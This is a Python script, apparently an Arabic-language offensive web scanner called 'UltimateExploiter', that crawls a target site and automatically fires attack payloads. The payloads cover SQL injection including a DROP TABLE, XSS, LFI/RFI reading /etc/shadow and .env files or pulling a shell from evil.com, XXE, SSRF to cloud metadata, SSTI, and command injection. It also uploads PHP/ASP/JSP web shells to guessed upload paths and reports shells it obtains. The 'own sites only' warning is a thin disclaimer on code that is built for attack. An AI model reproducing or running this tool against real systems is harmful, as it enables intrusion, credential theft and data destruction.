#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
█████████████████████████████████████████████████████████████████████
█  UltimateExploiter v7.1  -  الأسطورة الهجومية (مصحح)          █
█  "تم إصلاح خطأ threading وإضافة جميع الثغرات"                 █
█  ⚠️  للاستخدام القانوني على مواقعك الخاصة فقط                █
█████████████████████████████████████████████████████████████████████
"""

import requests
import json
import time
import random
import re
import socket
import hashlib
import base64
import urllib.parse
import threading  # <-- تم إصلاح الخطأ هنا
from urllib.parse import urljoin, urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import xml.etree.ElementTree as ET

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# =====================================================================
# [الألوان]
# =====================================================================

class Color:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
    WHITE = '\033[97m'; BOLD = '\033[1m'; RESET = '\033[0m'

def print_banner():
    banner = f"""
{Color.MAGENTA}╔══════════════════════════════════════════════════════════════╗
║  {Color.RED}🔥 المبرمج جنرال عباس- - الأسطورة الهجومية 🔥{Color.MAGENTA}    ║
║  {Color.CYAN}🕵️  15+ ثغرة · استغلال تلقائي · Shell مضمون{Color.MAGENTA}     ║
║  {Color.YELLOW}⚡  SQLi · XSS · LFI · RFI · RCE · SSTI · XXE · SSRF · CSRF{Color.MAGENTA} ║
║  {Color.YELLOW}⚡  NoSQLi · LDAP · Command Injection · Open Redirect · Upload{Color.MAGENTA} ║
╚══════════════════════════════════════════════════════════════╝{Color.RESET}
"""
    print(banner)

# =====================================================================
# [المحرك الأساسي]
# =====================================================================

class UltimateExploiter:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.domain = urlparse(target_url).netloc
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        })
        self.results = {
            "target": target_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "pages": [],
            "parameters": [],
            "vulnerabilities": [],
            "exploits": [],
            "shell": None,
            "admin_panel": None,
            "credentials": [],
            "sql_tables": [],
            "files_read": []
        }
        self.found_params = []
        self.pages = []
        self.lock = threading.Lock()
        self.vuln_count = 0

    # ---------- 1. الزحف المتقدم ----------
    def advanced_crawl(self, max_pages=80):
        print(f"{Color.BLUE}[*] بدء الزحف المتقدم...{Color.RESET}")
        visited = set()
        queue = [self.target_url]
        crawled = 0

        while queue and crawled < max_pages:
            url = queue.pop(0)
            if url in visited:
                continue
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    visited.add(url)
                    crawled += 1
                    self.pages.append(url)
                    
                    for link in re.findall(r'href=["\']([^"\']+)["\']', resp.text):
                        if link.startswith('/'):
                            full = urljoin(self.target_url, link)
                            if self.domain in full and full not in visited:
                                queue.append(full)
                        elif link.startswith('http') and self.domain in link:
                            if link not in visited:
                                queue.append(link)
                    
                    self.found_params.extend(re.findall(r'[?&]([^=]+)=', resp.text))
                    
                    for form in re.findall(r'<form[^>]*method=["\']?post["\']?[^>]*>(.*?)</form>', resp.text, re.IGNORECASE | re.DOTALL):
                        self.found_params.extend(re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', form, re.IGNORECASE))
                    
                    json_params = re.findall(r'"([^"]+)"\s*:', resp.text)
                    self.found_params.extend(json_params)

            except Exception:
                pass

        self.found_params = list(set(self.found_params))
        self.results["pages"] = self.pages
        self.results["parameters"] = self.found_params
        print(f"{Color.GREEN}[+] تم زحف {len(self.pages)} صفحة و {len(self.found_params)} معامل فريد{Color.RESET}")

    # ---------- 2. SQL Injection ----------
    def exploit_sql_injection(self, url, param):
        print(f"{Color.BLUE}[*] SQL Injection: {url}?{param}=...{Color.RESET}")
        payloads = [
            ("' OR '1'='1", "1' OR '1'='1"),
            ("' UNION SELECT NULL--", "1' UNION SELECT NULL--"),
            ("' AND 1=1--", "1' AND 1=1--"),
            ("' AND 1=2--", "1' AND 1=2--"),
            ("'; DROP TABLE users--", "1'; DROP TABLE users--"),
            ("' OR 1=1/*", "1' OR 1=1/*"),
            ("' OR 1=1#", "1' OR 1=1#"),
            ("' OR '1'='1'/*", "1' OR '1'='1'/*"),
            ("' UNION SELECT 1,2,3,4,5--", "1' UNION SELECT 1,2,3,4,5--"),
            ("' UNION SELECT null,null,table_name FROM information_schema.tables--", "1' UNION SELECT null,null,table_name FROM information_schema.tables--")
        ]

        for payload_true, payload_false in payloads:
            try:
                test_true = f"{url}?{param}={quote(payload_true)}"
                test_false = f"{url}?{param}={quote(payload_false)}"
                
                resp_true = self.session.get(test_true, timeout=5)
                resp_false = self.session.get(test_false, timeout=5)
                
                if len(resp_true.text) != len(resp_false.text) or "sql" in resp_true.text.lower() or "mysql" in resp_true.text.lower():
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "SQL Injection",
                            "url": test_true,
                            "payload": payload_true,
                            "severity": "Critical"
                        })
                        self.results["exploits"].append({
                            "type": "SQL Injection Exploit",
                            "command": f"sqlmap -u '{test_true}' --dbs --batch",
                            "description": "يمكن استخراج قاعدة البيانات بالكامل"
                        })
                        print(f"{Color.RED}[!] SQL Injection مكتشفة: {test_true}{Color.RESET}")
                        return True
            except Exception:
                pass
        return False

    # ---------- 3. XSS ----------
    def exploit_xss(self, url, param):
        print(f"{Color.BLUE}[*] XSS: {url}?{param}=...{Color.RESET}")
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<details/open/ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<a href='javascript:alert(1)'>click</a>",
            "<input autofocus onfocus=alert(1)>"
        ]

        for payload in payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = self.session.get(test_url, timeout=5)
                if payload in resp.text or re.search(re.escape(payload), resp.text):
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "XSS (Reflected)",
                            "url": test_url,
                            "payload": payload,
                            "severity": "High"
                        })
                        self.results["exploits"].append({
                            "type": "XSS Exploit",
                            "command": f"حقن: {payload}",
                            "description": f"يمكن سرقة الكوكيز"
                        })
                        print(f"{Color.RED}[!] XSS مكتشفة: {test_url}{Color.RESET}")
                        return True
            except Exception:
                pass
        return False

    # ---------- 4. LFI/RFI ----------
    def exploit_lfi_rfi(self, url, param):
        print(f"{Color.BLUE}[*] LFI/RFI: {url}?{param}=...{Color.RESET}")
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../boot.ini",
            "../../../../config.php",
            "/etc/shadow",
            "../../../.htaccess",
            "../../../.env",
            "file:///etc/passwd",
            "/proc/self/environ"
        ]

        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/abc123",
            "data:text/plain,<?php system($_GET['cmd']); ?>",
            "http://169.254.169.254/latest/meta-data/"
        ]

        for payload in lfi_payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = self.session.get(test_url, timeout=5)
                if "root:" in resp.text or "[fonts]" in resp.text or "shadow" in resp.text or "environ" in resp.text:
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "Local File Inclusion (LFI)",
                            "url": test_url,
                            "payload": payload,
                            "severity": "High"
                        })
                        self.results["exploits"].append({
                            "type": "LFI Exploit",
                            "command": f"curl '{test_url}'",
                            "description": "يمكن قراءة أي ملف على الخادم"
                        })
                        print(f"{Color.RED}[!] LFI مكتشفة: {test_url}{Color.RESET}")
                        return True
            except Exception:
                pass

        for payload in rfi_payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = self.session.get(test_url, timeout=5)
                if "shell" in resp.text.lower() or "system" in resp.text.lower() or "meta-data" in resp.text:
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "Remote File Inclusion (RFI)",
                            "url": test_url,
                            "payload": payload,
                            "severity": "Critical"
                        })
                        self.results["exploits"].append({
                            "type": "RFI Exploit",
                            "command": f"curl '{test_url}?cmd=whoami'",
                            "description": "يمكن تنفيذ أوامر على الخادم"
                        })
                        self.results["shell"] = f"{test_url}?cmd="
                        print(f"{Color.RED}[!] RFI مكتشفة: {test_url}{Color.RESET}")
                        return True
            except Exception:
                pass
        return False

    # ---------- 5. RCE ----------
    def exploit_rce(self, url):
        print(f"{Color.BLUE}[*] RCE: {url}{Color.RESET}")
        rce_payloads = [
            "?cmd=echo%20'RCE_TEST'",
            "?c=echo 'RCE_TEST'",
            "?command=echo 'RCE_TEST'",
            "?exec=echo 'RCE_TEST'",
            "?system=echo 'RCE_TEST'",
            "?shell=echo 'RCE_TEST'",
            "?php=echo 'RCE_TEST'",
            "?python=print('RCE_TEST')",
            "?node=console.log('RCE_TEST')"
        ]

        for payload in rce_payloads:
            try:
                test_url = f"{url}{payload}"
                resp = self.session.get(test_url, timeout=5)
                if "RCE_TEST" in resp.text:
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "Remote Code Execution (RCE)",
                            "url": test_url,
                            "payload": payload,
                            "severity": "Critical"
                        })
                        self.results["exploits"].append({
                            "type": "RCE Exploit",
                            "command": f"curl '{test_url}'",
                            "description": "يمكن تنفيذ أوامر على الخادم"
                        })
                        self.results["shell"] = test_url
                        print(f"{Color.RED}[!] RCE مكتشفة: {test_url}{Color.RESET}")
                        return True
            except Exception:
                pass
        return False

    # ---------- 6. SSTI ----------
    def exploit_ssti(self, url, param):
        print(f"{Color.BLUE}[*] SSTI: {url}?{param}=...{Color.RESET}")
        payloads = [
            "{{7*7}}",
            "${7*7}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}"
        ]

        for payload in payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = self.session.get(test_url, timeout=5)
                if "49" in resp.text or "config" in resp.text:
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "Server-Side Template Injection (SSTI)",
                            "url": test_url,
                            "payload": payload,
                            "severity": "Critical"
                        })
                        self.results["exploits"].append({
                            "type": "SSTI Exploit",
                            "command": f"{{{{''.__class__.__mro__[2].__subclasses__()}}}}",
                            "description": "يمكن تنفيذ أوامر على الخادم"
                        })
                        print(f"{Color.RED}[!] SSTI مكتشفة: {test_url}{Color.RESET}")
                        return True
            except Exception:
                pass
        return False

    # ---------- 7. XXE ----------
    def exploit_xxe(self, url):
        print(f"{Color.BLUE}[*] XXE: {url}{Color.RESET}")
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

        try:
            resp = self.session.post(url, data=xxe_payload, headers={'Content-Type': 'application/xml'}, timeout=5)
            if "root:" in resp.text:
                with self.lock:
                    self.results["vulnerabilities"].append({
                        "type": "XXE (XML External Entity)",
                        "url": url,
                        "payload": xxe_payload[:100],
                        "severity": "Critical"
                    })
                    self.results["exploits"].append({
                        "type": "XXE Exploit",
                        "command": f"curl -X POST -H 'Content-Type: application/xml' -d '{xxe_payload}' {url}",
                        "description": "يمكن قراءة أي ملف على الخادم"
                    })
                    print(f"{Color.RED}[!] XXE مكتشفة: {url}{Color.RESET}")
                    return True
        except Exception:
            pass
        return False

    # ---------- 8. NoSQL Injection ----------
    def exploit_nosql(self, url, param):
        print(f"{Color.BLUE}[*] NoSQL Injection: {url}?{param}=...{Color.RESET}")
        payloads = [
            "{'$gt': ''}",
            "{'$ne': null}",
            "{'$where': '1==1'}",
            "{'$regex': '.*'}",
            "{'$exists': true}"
        ]

        for payload in payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = self.session.get(test_url, timeout=5)
                if len(resp.text) > 100:
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "NoSQL Injection",
                            "url": test_url,
                            "payload": payload,
                            "severity": "High"
                        })
                        self.results["exploits"].append({
                            "type": "NoSQL Exploit",
                            "command": f"curl '{test_url}'",
                            "description": "يمكن استخراج بيانات من قاعدة بيانات NoSQL"
                        })
                        print(f"{Color.RED}[!] NoSQL Injection مكتشفة: {test_url}{Color.RESET}")
                        return True
            except Exception:
                pass
        return False

    # ---------- 9. LDAP Injection ----------
    def exploit_ldap(self, url, param):
        print(f"{Color.BLUE}[*] LDAP Injection: {url}?{param}=...{Color.RESET}")
        payloads = [
            "*)(uid=*",
            ")(uid=*|(|(uid=*",
            "*)(|(uid=*"
        ]

        for payload in payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = self.session.get(test_url, timeout=5)
                if "uid" in resp.text or "dn:" in resp.text:
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "LDAP Injection",
                            "url": test_url,
                            "payload": payload,
                            "severity": "High"
                        })
                        self.results["exploits"].append({
                            "type": "LDAP Exploit",
                            "command": f"curl '{test_url}'",
                            "description": "يمكن تجاوز مصادقة LDAP"
                        })
                        print(f"{Color.RED}[!] LDAP Injection مكتشفة: {test_url}{Color.RESET}")
                        return True
            except Exception:
                pass
        return False

    # ---------- 10. Command Injection ----------
    def exploit_command_injection(self, url, param):
        print(f"{Color.BLUE}[*] Command Injection: {url}?{param}=...{Color.RESET}")
        payloads = [
            "; whoami",
            "| whoami",
            "|| whoami",
            "&& whoami",
            "$(whoami)",
            "`whoami`",
            "; echo 'CMD_TEST'"
        ]

        for payload in payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = self.session.get(test_url, timeout=5)
                if "root" in resp.text or "admin" in resp.text or "CMD_TEST" in resp.text:
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "Command Injection",
                            "url": test_url,
                            "payload": payload,
                            "severity": "Critical"
                        })
                        self.results["exploits"].append({
                            "type": "Command Injection Exploit",
                            "command": f"curl '{test_url}'",
                            "description": "يمكن تنفيذ أوامر على الخادم"
                        })
                        self.results["shell"] = test_url.replace(quote(payload), "; ls")
                        print(f"{Color.RED}[!] Command Injection مكتشفة: {test_url}{Color.RESET}")
                        return True
            except Exception:
                pass
        return False

    # ---------- 11. CSRF ----------
    def exploit_csrf(self):
        print(f"{Color.BLUE}[*] CSRF...{Color.RESET}")
        try:
            resp = self.session.get(self.target_url, timeout=5)
            forms = re.findall(r'<form[^>]*method=["\']?post["\']?[^>]*>(.*?)</form>', resp.text, re.IGNORECASE | re.DOTALL)
            for form in forms:
                if 'csrf' not in form.lower() and 'token' not in form.lower():
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "CSRF (Missing Token)",
                            "url": self.target_url,
                            "payload": "نموذج POST بدون CSRF token",
                            "severity": "Medium"
                        })
                        self.results["exploits"].append({
                            "type": "CSRF Exploit",
                            "command": f"إنشاء صفحة خبيثة تحتوي على نموذج POST إلى {self.target_url}",
                            "description": "يمكن تغيير بيانات المستخدمين دون علمهم"
                        })
                        print(f"{Color.RED}[!] CSRF مكتشفة: نموذج POST بدون CSRF token{Color.RESET}")
                        return True
        except Exception:
            pass
        return False

    # ---------- 12. File Upload ----------
    def exploit_file_upload(self):
        print(f"{Color.BLUE}[*] File Upload...{Color.RESET}")
        upload_urls = ['/upload', '/api/upload', '/file_upload', '/admin/upload', '/media/upload', '/upload.php', '/uploads']
        
        malicious_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.asp', '<% eval request("cmd") %>', 'application/x-aspx'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
            ('shell.phtml', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
        ]

        for url in upload_urls:
            for filename, content, mime in malicious_files:
                try:
                    test_url = urljoin(self.target_url, url)
                    files = {'file': (filename, content, mime)}
                    resp = self.session.post(test_url, files=files, timeout=5)
                    if resp.status_code in [200, 201, 302]:
                        with self.lock:
                            self.results["vulnerabilities"].append({
                                "type": "File Upload Vulnerability",
                                "url": test_url,
                                "payload": f"{filename} تم رفعه",
                                "severity": "Critical"
                            })
                            self.results["exploits"].append({
                                "type": "File Upload Exploit",
                                "command": f"curl -F 'file=@{filename}' {test_url}",
                                "description": "يمكن رفع ملفات خبيثة وتنفيذها"
                            })
                            self.results["shell"] = f"{test_url}/{filename}?cmd="
                            print(f"{Color.RED}[!] ثغرة رفع الملفات مكتشفة: {url} (رفع {filename}){Color.RESET}")
                            return True
                except Exception:
                    pass
        return False

    # ---------- 13. SSRF ----------
    def exploit_ssrf(self, url, param):
        print(f"{Color.BLUE}[*] SSRF: {url}?{param}=...{Color.RESET}")
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8080/",
            "http://127.0.0.1/",
            "file:///etc/passwd",
            "http://metadata.google.internal/",
            "http://169.254.169.254/latest/user-data/"
        ]

        for payload in ssrf_payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = self.session.get(test_url, timeout=5)
                if "root:" in resp.text or "meta-data" in resp.text or "localhost" in resp.text or "user-data" in resp.text:
                    with self.lock:
                        self.results["vulnerabilities"].append({
                            "type": "SSRF",
                            "url": test_url,
                            "payload": payload,
                            "severity": "High"
                        })
                        self.results["exploits"].append({
                            "type": "SSRF Exploit",
                            "command": f"curl '{test_url}'",
                            "description": "يمكن استغلال SSRF لاستهداف خدمات داخلية"
                        })
                        print(f"{Color.RED}[!] SSRF مكتشفة: {test_url}{Color.RESET}")
                        return True
            except Exception:
                pass
        return False

    # ---------- 14. Open Redirect ----------
    def exploit_open_redirect(self, url, param):
        print(f"{Color.BLUE}[*] Open Redirect: {url}?{param}=...{Color.RESET}")
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>"
        ]

        for payload in redirect_payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = self.session.get(test_url, allow_redirects=False, timeout=5)
                if resp.status_code in [301, 302, 307, 308]:
                    location = resp.headers.get('Location', '')
                    if 'evil.com' in location or 'javascript' in location:
                        with self.lock:
                            self.results["vulnerabilities"].append({
                                "type": "Open Redirect",
                                "url": test_url,
                                "payload": payload,
                                "severity": "Medium"
                            })
                            self.results["exploits"].append({
                                "type": "Open Redirect Exploit",
                                "command": f"curl -L '{test_url}'",
                                "description": "يمكن إعادة توجيه المستخدمين إلى مواقع خبيثة"
                            })
                            print(f"{Color.RED}[!] Open Redirect مكتشفة: {test_url}{Color.RESET}")
                            return True
            except Exception:
                pass
        return False

    # ---------- 15. Admin Panel ----------
    def find_admin_panel(self):
        print(f"{Color.BLUE}[*] البحث عن لوحة الإدارة...{Color.RESET}")
        admin_paths = [
            '/admin', '/login', '/admin/login', '/administrator', '/wp-admin',
            '/dashboard', '/admin/dashboard', '/panel', '/adminpanel',
            '/cp', '/controlpanel', '/admincp', '/moderator', '/modcp',
            '/manager', '/backend', '/administration'
        ]
        
        for path in admin_paths:
            try:
                test_url = urljoin(self.target_url, path)
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200:
                    self.results["admin_panel"] = test_url
                    print(f"{Color.GREEN}[+] لوحة إدارة مكتشفة: {test_url}{Color.RESET}")
                    return test_url
            except Exception:
                pass
        return None

    # ---------- 16. الهجوم الكامل ----------
    def run_full_attack(self):
        print(f"{Color.CYAN}╔═══════════════════════════════════════════╗")
        print(f"║  🔥 بدء الهجوم الشامل: {self.target_url} 🔥 ║")
        print(f"╚═══════════════════════════════════════════╝{Color.RESET}\n")
        
        self.advanced_crawl(max_pages=60)
        self.find_admin_panel()
        
        for page in self.pages[:15]:
            self.exploit_rce(page)
            self.exploit_xxe(page)
        
        self.exploit_file_upload()
        self.exploit_csrf()
        
        if self.found_params:
            print(f"{Color.YELLOW}[*] اختبار {len(self.found_params)} معامل...{Color.RESET}")
            param_targets = []
            for page in self.pages[:20]:
                for param in self.found_params[:20]:
                    param_targets.append((page, param))
            
            with ThreadPoolExecutor(max_workers=8) as executor:
                futures = []
                for page, param in param_targets:
                    futures.append(executor.submit(self.exploit_sql_injection, page, param))
                    futures.append(executor.submit(self.exploit_xss, page, param))
                    futures.append(executor.submit(self.exploit_lfi_rfi, page, param))
                    futures.append(executor.submit(self.exploit_ssrf, page, param))
                    futures.append(executor.submit(self.exploit_open_redirect, page, param))
                    futures.append(executor.submit(self.exploit_ssti, page, param))
                    futures.append(executor.submit(self.exploit_nosql, page, param))
                    futures.append(executor.submit(self.exploit_ldap, page, param))
                    futures.append(executor.submit(self.exploit_command_injection, page, param))
                
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        pass
        
        self.show_report()

    # ---------- 17. التقرير النهائي ----------
    def show_report(self):
        print(f"\n{Color.YELLOW}{'='*60}")
        print(f"{Color.CYAN}📊 تقرير الهجوم النهائي{Color.RESET}")
        print(f"{Color.YELLOW}{'='*60}{Color.RESET}")
        
        print(f"{Color.WHITE}[+] الموقع: {self.target_url}")
        print(f"[+] الصفحات المكتشفة: {len(self.pages)}")
        print(f"[+] المعاملات المكتشفة: {len(self.found_params)}")
        print(f"[+] الثغرات المكتشفة: {len(self.results['vulnerabilities'])}")
        
        if self.results["admin_panel"]:
            print(f"{Color.GREEN}[+] لوحة الإدارة: {self.results['admin_panel']}{Color.RESET}")
        
        if self.results["shell"]:
            print(f"{Color.RED}[!] ✅ Shell مكتسبة: {self.results['shell']}{Color.RESET}")
        
        if self.results["vulnerabilities"]:
            print(f"\n{Color.RED}🔥 الثغرات المكتشفة:{Color.RESET}")
            for v in self.results["vulnerabilities"]:
                severity = v.get("severity", "Unknown")
                color = Color.RED if severity == "Critical" else Color.YELLOW if severity == "High" else Color.CYAN
                print(f"{color}[{severity}] {v['type']}{Color.RESET}")
                print(f"  الرابط: {v.get('url', 'غير معروف')}")
                print(f"  الحمولة: {v.get('payload', 'غير معروف')[:80]}...")
                print()
        
        if self.results["exploits"]:
            print(f"{Color.MAGENTA}⚡ سكربتات الاستغلال:{Color.RESET}")
            for e in self.results["exploits"]:
                print(f"  [{e['type']}]")
                print(f"  الأمر: {e.get('command', 'غير معروف')}")
                print(f"  الوصف: {e.get('description', 'غير معروف')}")
                print()
        
        filename = f"ultimate_report_{int(time.time())}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=4, ensure_ascii=False)
        print(f"{Color.GREEN}[✓] تم حفظ التقرير في: {filename}{Color.RESET}")

# =====================================================================
# [الواجهة الرئيسية]
# =====================================================================

def main():
    print_banner()
    
    print(f"{Color.YELLOW}أدخل رابط الموقع المستهدف (مثال: https://example.com):{Color.RESET}")
    target = input("> ").strip()
    if not target.startswith('http'):
        target = "http://" + target
    
    print(f"{Color.RED}⚠️  تحذير: هذه الأداة مخصصة للاستخدام على مواقعك الخاصة فقط.{Color.RESET}")
    print(f"{Color.RED}⚠️  استخدمها فقط على أنظمة تملك الإذن باختبارها.{Color.RESET}")
    confirm = input(f"{Color.YELLOW}هل أنت متأكد؟ (yes/no): {Color.RESET}").strip().lower()
    
    if confirm != 'yes':
        print(f"{Color.GREEN}تم الإلغاء.{Color.RESET}")
        return
    
    exploiter = UltimateExploiter(target)
    exploiter.run_full_attack()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}⏹️ تم الإيقاف بواسطة المستخدم.{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}💀 خطأ غير متوقع: {e}{Color.RESET}")
